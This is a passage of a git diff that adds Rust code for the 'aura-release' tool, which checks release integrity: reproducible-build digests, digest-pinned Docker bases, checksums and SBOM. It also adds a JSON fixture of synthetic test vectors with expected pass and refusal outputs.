++        .find_map(|line| line.split_once("  ").filter(|(_, name)| *name == binary))
++        .map(|(digest, _)| digest.to_string())
++        .ok_or_else(|| format!("repro mismatch: {binary}"))?;
++    if pinned_digest != *first {
++        return Err(format!("repro mismatch: {binary}"));
++    }
++
++    // Docker policy: multi-stage with digest-pinned bases (D-O1-4).
++    let dockerfile = std::fs::read_to_string(release.join("../docker/Dockerfile"))
++        .or_else(|_| std::fs::read_to_string("docker/Dockerfile"))
++        .map_err(|_| "cannot read dockerfile".to_string())?;
++    let mut bases = Vec::new();
++    for raw in dockerfile.lines() {
++        let line = raw.trim();
++        if let Some(rest) = line.strip_prefix("FROM ") {
++            let image = rest.split_whitespace().next().unwrap_or("");
++            if !image.is_empty() {
++                bases.push(image.to_string());
++            }
++        }
++    }
++    if bases.len() < 2 {
++        return Err("docker single stage".to_string());
++    }
++    for image in &bases {
++        let pinned = image
++            .split_once("@sha256:")
++            .map(|(_, digest)| {
++                digest.len() == 64 && digest.chars().all(|ch| ch.is_ascii_hexdigit())
++            })
++            .unwrap_or(false);
++        if !pinned {
++            let shown = image.split('@').next().unwrap_or(image);
++            return Err(format!("docker base unpinned: {shown}"));
++        }
++    }
++
++    Ok(format!(
++        "release=ok version={} artifacts={}",
++        manifest.version,
++        manifest.artifacts.len()
++    ))
++}
++
++/// Regenerate `manifest.txt`, `SHA256SUMS` and `SBOM.txt` from the release
++/// directory (artifact discovery: files that are not `.sig`, the manifest
++/// records or `repro.txt`) and the workspace.
++fn sync(workspace: &Workspace, release: &Path) -> Result<String, String> {
++    let previous = std::fs::read_to_string(release.join("manifest.txt"))
++        .ok()
++        .and_then(|text| parse_manifest(&text).ok());
++    let pinned = std::fs::read_to_string(release.join("../docs/release-pubkey.txt"))
++        .or_else(|_| std::fs::read_to_string("docs/release-pubkey.txt"))
++        .map_err(|_| "cannot read release pubkey".to_string())?
++        .trim()
++        .to_string();
++    let entries = std::fs::read_dir(release).map_err(|_| "cannot read release".to_string())?;
++    let mut names: Vec<String> = Vec::new();
++    for entry in entries.flatten() {
++        if !entry.path().is_file() {
++            continue;
++        }
++        let name = entry.file_name().to_string_lossy().to_string();
++        if name.ends_with(".sig")
++            || matches!(
++                name.as_str(),
++                "manifest.txt" | "SHA256SUMS" | "SBOM.txt" | "repro.txt"
++            )
++        {
++            continue;
++        }
++        names.push(name);
++    }
++    names.sort();
++    if names.is_empty() {
++        return Err("release empty".to_string());
++    }
++    let mut out = String::new();
++    out.push_str("# AuraLite release manifest (O1) — checked by `aura-release check`.\n");
++    out.push_str(
++        "# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\n",
++    );
++    out.push_str(&format!("rule {RULE}\n"));
++    out.push_str(&format!("version {}\n", workspace.version));
++    out.push_str(&format!("keyid {pinned}\n"));
++    for name in &names {
++        out.push_str(&format!("artifact {name}\n"));
++    }
++    for name in &names {
++        if release.join(format!("{name}.sig")).is_file() {
++            out.push_str(&format!("sig {name} {name}.sig\n"));
++        }
++    }
++    let _ = previous;
++    std::fs::write(release.join("manifest.txt"), &out)
++        .map_err(|_| "cannot write manifest".to_string())?;
++    let manifest = parse_manifest(&out)?;
++    let sums = checksums_text(release, &manifest)?;
++    std::fs::write(release.join("SHA256SUMS"), sums)
++        .map_err(|_| "cannot write SHA256SUMS".to_string())?;
++    std::fs::write(release.join("SBOM.txt"), sbom_text(workspace))
++        .map_err(|_| "cannot write SBOM".to_string())?;
++    Ok(format!("synced artifacts={}", names.len()))
++}
++
++// --------------------------------------------------------------------------- CLI driver
++
++/// Read a whole file to text.
++fn read_text(path: &str) -> Result<String, String> {
++    std::fs::read_to_string(path).map_err(|_| format!("cannot read {path}"))
++}
++
++/// Collect `--flag value` pairs from the argument tail.
++fn flags(rest: &[String]) -> Result<std::collections::BTreeMap<String, String>, String> {
++    let mut map = std::collections::BTreeMap::new();
++    let mut index = 0;
++    while index < rest.len() {
++        let flag = &rest[index];
++        let name = flag
++            .strip_prefix("--")
++            .ok_or_else(|| format!("expected --flag, got {flag}"))?;
++        if index + 1 >= rest.len() {
++            return Err(format!("missing value for --{name}"));
++        }
++        map.insert(name.to_string(), rest[index + 1].clone());
++        index += 2;
++    }
++    Ok(map)
++}
++
++/// Execute one `aura-release` command against the given streams; returns the
++/// exit code (0 ok, 64 usage, 65 refusal).
++pub fn run(args: &[String], out: &mut dyn Write, err: &mut dyn Write) -> i32 {
++    let mut dispatch = || -> Result<(), String> {
++        let (command, rest) = args.split_first().ok_or("usage:missing command")?;
++        let map = flags(rest).map_err(|message| format!("usage:{message}"))?;
++        let workspace_dir = map
++            .get("workspace")
++            .cloned()
++            .unwrap_or_else(|| ".".to_string());
++        let release_dir = map
++            .get("release")
++            .cloned()
++            .unwrap_or_else(|| "release".to_string());
++        let workspace = parse_workspace(Path::new(&workspace_dir))?;
++        match command.as_str() {
++            "check" => {
++                let ok = check(&workspace, Path::new(&release_dir))?;
++                let _ = writeln!(out, "{ok}");
++                Ok(())
++            }
++            "sbom" => {
++                let _ = write!(out, "{}", sbom_text(&workspace));
++                Ok(())
++            }
++            "checksums" => {
++                let manifest = parse_manifest(&read_text(&format!("{release_dir}/manifest.txt"))?)?;
++                let sums = checksums_text(Path::new(&release_dir), &manifest)?;
++                let _ = write!(out, "{sums}");
++                Ok(())
++            }
++            "digest" => {
++                let path = map
++                    .get("file")
++                    .ok_or_else(|| "usage:missing --file".to_string())?;
++                let data = std::fs::read(path).map_err(|_| format!("cannot read {path}"))?;
++                let _ = writeln!(out, "{}", hex(&sha256(&data)));
++                Ok(())
++            }
++            "sync" => {
++                let message = sync(&workspace, Path::new(&release_dir))?;
++                let _ = writeln!(out, "{message}");
++                Ok(())
++            }
++            other => Err(format!("usage:unknown command {other}")),
++        }
++    };
++    match dispatch() {
++        Ok(()) => 0,
++        Err(message) => match message.strip_prefix("usage:") {
++            Some(detail) => {
++                let _ = writeln!(err, "error: usage: {detail}");
++                EXIT_USAGE
++            }
++            None => {
++                let _ = writeln!(err, "error: release: {message}");
++                EXIT_REFUSED
++            }
++        },
++    }
++}
+diff --git a/crates/aura-testkit/tests/fixtures/o1_release_vectors.json b/crates/aura-testkit/tests/fixtures/o1_release_vectors.json
+new file mode 100644
+index 0000000..4a9a5a5
+--- /dev/null
++++ b/crates/aura-testkit/tests/fixtures/o1_release_vectors.json
+@@ -0,0 +1,342 @@
++{
++ "gate": "O1 release pipeline: 10/10 cases pass; named negative control repro_mismatch_refused red on the dropped two-host equality check; 6/6 NC red under tools/nc_o1.py; two independent hosts -> identical binary sha256 (the O1 gate)",
++ "notice": "Independent Python oracle (tools/gen_o1_vectors.py, hashlib sha256); verifier: crates/aura-testkit/tests/o1_release.rs against aura_testkit::release (std-only SHA-256). Replace the whole file only with tools/gen_o1_vectors.py output.",
++ "named_control": "repro_mismatch_refused",
++ "files": {},
++ "cases": [
++  {
++   "name": "release_valid_passes",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ],
++    [
++     "checksums",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 0,
++   "stdout": "release=ok version=0.1.0 artifacts=2\nbb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++   "stderr": "",
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   },
++   "phase": "O1"
++  },
++  {
++   "name": "sbom_regeneration_deterministic",
++   "sandbox": "",
++   "argv": [
++    [
++     "sbom",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 0,
++   "stdout": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++   "stderr": "",
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "repro_mismatch_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: repro mismatch: aura-bin\n",
++   "nc_ref": 1,
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 fe86119ef9718c62fe2c643373e54f8e7f1047b1e6da468befa19fb95156f390\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "version_drift_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: version drift: 0.2.0\n",
++   "nc_ref": 2,
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.2.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "changelog_missing_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: changelog entry missing: 0.1.0\n",
++   "nc_ref": 3,
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\nno release entry\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "sbom_drift_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: sbom drift\n",
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-gamma\npkg name=aura-gamma version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "checksum_mismatch_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: checksum mismatch: aura-bin\n",
++   "nc_ref": 4,
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "d121be3103007b41edf96f8262925f8c7d61894afe9a041843b631f69445bc57  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "signature_malformed_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: signature malformed: aura-bin\n",
++   "nc_ref": 5,
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
